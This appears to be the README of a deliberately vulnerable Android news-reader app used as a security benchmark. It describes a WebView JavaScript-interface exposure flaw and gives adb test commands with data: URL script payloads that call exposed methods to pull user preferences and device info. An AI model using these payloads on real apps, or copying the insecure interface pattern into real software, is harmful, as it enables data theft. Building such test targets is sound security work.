# oxo-android-ben41 News Reader App

## Attack Vector 3: JavaScript Interface Exposure with Malicious Content

**Vulnerability**: WebView has JavaScript enabled and exposes Android Java objects to JavaScript, allowing malicious web content to access sensitive app functionality and data.

**Key Issues**:
- `webView.addJavascriptInterface()` used without proper security
- JavaScript interface exposes sensitive methods to web content
- Malicious HTML/JavaScript can call Android methods directly
- Potential for data exfiltration and unauthorized actions

**Difficulty**: High

## Testing

```bash
# Test with malicious HTML file that exploits JavaScript interface
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///android_asset/malicious.html"

# Test with malicious URL that contains JavaScript exploitation
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "data:text/html,<script>alert(NewsReader.getUserPreferences())</script>"

# Test device info extraction
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "data:text/html,<script>alert(NewsReader.getDeviceInfo())</script>"
```
